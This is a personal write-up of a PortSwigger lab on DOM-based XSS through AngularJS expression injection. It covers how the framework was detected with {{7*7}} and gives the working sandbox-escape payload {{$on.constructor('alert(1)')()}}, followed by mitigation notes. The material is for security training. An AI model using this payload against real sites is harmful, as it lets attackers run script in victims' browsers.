# Lab08 - DOM XSS in AngularJS Expression

## Objective

Exploit an AngularJS application that evaluates user-controlled expressions.

Execute:

```javascript
alert(1)
```

using an AngularJS expression.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | DOM-Based XSS |
| Difficulty | Practitioner |
| Framework | AngularJS |
| Source | Search Parameter |
| Sink | AngularJS Expression Evaluation |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application reflects user input into a page containing:

```html
ng-app
```

directive.

AngularJS automatically evaluates:

```html
{{ }}
```

expressions.

---

# Vulnerable Pattern

```html
<body ng-app>

Search results for:
USER_INPUT

</body>
```

---

Input becomes part of an AngularJS template.

---

# Analysis

## Step 1

Inspect page source.

---

## Step 2

Search for:

```html
ng-app
```

---

Observation:

```html
<body ng-app>
```

present.

---

## Step 3

Verify AngularJS Execution

Payload:

```html
{{7*7}}
```

---

Result:

```text
49
```

---

AngularJS confirmed.

---

## Step 4

Craft Exploit

Need expression that executes JavaScript.

---

# Full Payload(s) Used

## Angular Detection

```html
{{7*7}}
```

---

## Final Payload

```html
{{$on.constructor('alert(1)')()}}
```

---

# Why The Payload Works

AngularJS evaluates:

```html
{{ expression }}
```

---

Payload:

```javascript
$on.constructor(
'alert(1)'
)()
```

---

Execution Flow

```text
Angular Expression
        ↓
Function Constructor
        ↓
alert(1)
        ↓
Execution
```

---

# Personal Analysis & Testing Process

## Initial Goal

Determine whether:

```text
AngularJS
```

is present.

---

## Framework Detection

Used:

```html
{{7*7}}
```

---

Observed:

```text
49
```

---

## Key Realization

Page evaluates:

```html
{{ }}
```

expressions.

---

## Exploitation Strategy

Abuse AngularJS constructor chain.

---

Payload Chosen

```html
{{$on.constructor('alert(1)')()}}
```

---

Reason:

```text
Reliable
Short
Common AngularJS Sandbox Escape
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Upgrade AngularJS.

Avoid:

```text
Evaluating User Input
```

inside Angular templates.

Use strict contextual escaping.

---

# Related Theory

- 18-dom-xss-in-angularjs.md

---

# Key Learnings

- AngularJS introduces framework-specific XSS.
- {{ }} expressions should always be tested.
- ng-app is a strong indicator.
- HTML encoding alone may not stop AngularJS XSS.

Indicator:
ng-app

Detection:
{{7*7}}

Exploit:
{{$on.constructor('alert(1)')()}}